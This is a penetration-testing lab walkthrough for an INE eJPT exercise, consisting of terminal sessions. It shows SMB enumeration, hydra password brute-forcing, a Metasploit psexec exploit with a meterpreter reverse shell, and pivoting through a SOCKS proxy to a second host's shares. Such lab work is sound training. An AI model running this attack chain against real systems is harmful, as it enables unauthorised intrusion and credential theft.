```jsx
Lab Name: NetBIOS Hacking
Platform: INE
Lab No: 20
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
root@INE:~# ping -c 2 demo.ine.local
PING demo.ine.local (10.4.17.124) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.17.124): icmp_seq=1 ttl=125 time=10.6 ms
64 bytes from demo.ine.local (10.4.17.124): icmp_seq=2 ttl=125 time=10.1 ms

--- demo.ine.local ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 10.133/10.348/10.563/0.215 ms
root@INE:~# ping -c 2 demo1.ine.local
PING demo1.ine.local (10.4.21.156) 56(84) bytes of data.
^C
--- demo1.ine.local ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1023ms
```

## NMAP Scan:

```console
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:09 IST
Nmap scan report for demo.ine.local (10.4.17.124)
Host is up (0.0091s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

```console
root@INE:~# nmap demo.ine.local -p 139,445 -sV -O
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:10 IST
Nmap scan report for demo.ine.local (10.4.17.124)
Host is up (0.0096s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 8.1 (96%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows Vista SP1 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows Server 2008 R2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```

## SMB Scans:

```console
root@INE:~# nmap -p445 --script smb-protocols demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:11 IST
Nmap scan report for demo.ine.local (10.4.17.124)
Host is up (0.0093s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|_    3.0.2

Nmap done: 1 IP address (1 host up) scanned in 5.40 seconds
```

```console
root@INE:~# nmap -p445 --script smb-security-mode demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:12 IST
Nmap scan report for demo.ine.local (10.4.17.124)
Host is up (0.0095s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

```console
root@INE:~# nmap -p445 --script smb-enum-users.nse  demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:13 IST
Nmap scan report for demo.ine.local (10.4.17.124)
Host is up (0.011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009)
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Normal user account, Password does not expire, Account disabled
|   ATTACKDEFENSE\root (RID: 1010)
|_    Flags:       Normal user account, Password does not expire

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

```console
root@INE:~# echo "admin" > users.txt
root@INE:~# echo "Administrator" > users.txt
root@INE:~# echo "root" > users.txt
root@INE:~# cat users.txt 
root
admin
Administrator
```

## Exploitation:

```console
root@INE:~# hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 16:17:22
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: root   password: elizabeth
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
[445][smb] host: demo.ine.local   login: Administrator   password: password1
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-31 16:17:27
```

```console
root@INE:~# msfconsole -q
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder sha
                                                    re
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.50.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/smb/psexec) > set RHOST demo.ine.local
RHOST => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password1
SMBPass => password1
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.50.2:4444 
[*] 10.4.17.124:445 - Connecting to the server...
[*] 10.4.17.124:445 - Authenticating to 10.4.17.124:445 as user 'Administrator'...
[*] 10.4.17.124:445 - Selecting PowerShell target
[*] 10.4.17.124:445 - Executing the payload...
[+] 10.4.17.124:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.4.17.124
[*] Meterpreter session 1 opened (10.10.50.2:4444 -> 10.4.17.124:49392 ) at 2024-08-31 16:21:56 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

## Pivoting:

```console
meterpreter > shell
Process 2596 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::d080:23bb:627f:2e31%13
   IPv4 Address. . . . . . . . . . . : 10.4.17.124
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1

Tunnel adapter isatap.ec2.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ec2.internal

C:\Windows\system32>arp -a
arp -a

Interface: 10.4.17.124 --- 0xd
  Internet Address      Physical Address      Type
  10.4.16.1             0e-ef-4e-ab-e7-33     dynamic   
  10.4.22.37            0e-cd-35-10-3e-ff     dynamic   
  10.4.26.187           0e-e7-07-83-7b-35     dynamic   
  10.4.29.144           0e-36-89-16-fa-f9     dynamic   
  10.4.31.255           ff-ff-ff-ff-ff-ff     static    
  169.254.169.254       0e-ef-4e-ab-e7-33     dynamic   
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static    

C:\Windows\system32>ping 10.4.21.156
ping 10.4.21.156

Pinging 10.4.21.156 with 32 bytes of data:
Reply from 10.4.21.156: bytes=32 time<1ms TTL=128
Reply from 10.4.21.156: bytes=32 time<1ms TTL=128
Reply from 10.4.21.156: bytes=32 time<1ms TTL=128
Reply from 10.4.21.156: bytes=32 time<1ms TTL=128

Ping statistics for 10.4.21.156:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

```console
C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > run autoroute -s 10.0.22.69/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.0.22.69/255.255.240.0...
[+] Added route to 10.0.22.69/255.255.240.0 via 10.4.17.124
[*] Use the -p option to list all active routes
meterpreter > cat /etc/proxychains4.conf
[-] stdapi_fs_stat: Operation failed: The system cannot find the path specified.
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

```console
msf6 auxiliary(server/socks_proxy) > proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
[*] exec: proxychains nmap demo1.ine.local -sT -Pn -sV -p 445

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-31 16:35 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout
Nmap scan report for demo1.ine.local (10.4.21.156)
Host is up (0.00014s latency).

PORT    STATE  SERVICE      VERSION
445/tcp closed microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

```console
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > migrate -N explorer.exe
[*] Migrating from 1428 to 2576...
[*] Migration completed successfully.
meterpreter > shell
Process 2992 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```console
C:\Windows\system32>net view 10.4.21.156
net view 10.4.21.156
Shared resources at 10.4.21.156



Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
Documents   Disk                    
K           Disk                    
The command completed successfully.
```

```console
C:\Windows\system32>net use K: \\10.4.21.156\K$
net use K: \\10.4.21.156\K$
The command completed successfully.


C:\Windows\system32>dir K:    
dir K:
 Volume in drive K is New Volume
 Volume Serial Number is E654-107F

 Directory of K:\

11/17/2021  03:34 PM           327,590 wallpaper.png
               1 File(s)        327,590 bytes
               0 Dir(s)  10,951,335,936 bytes free

```
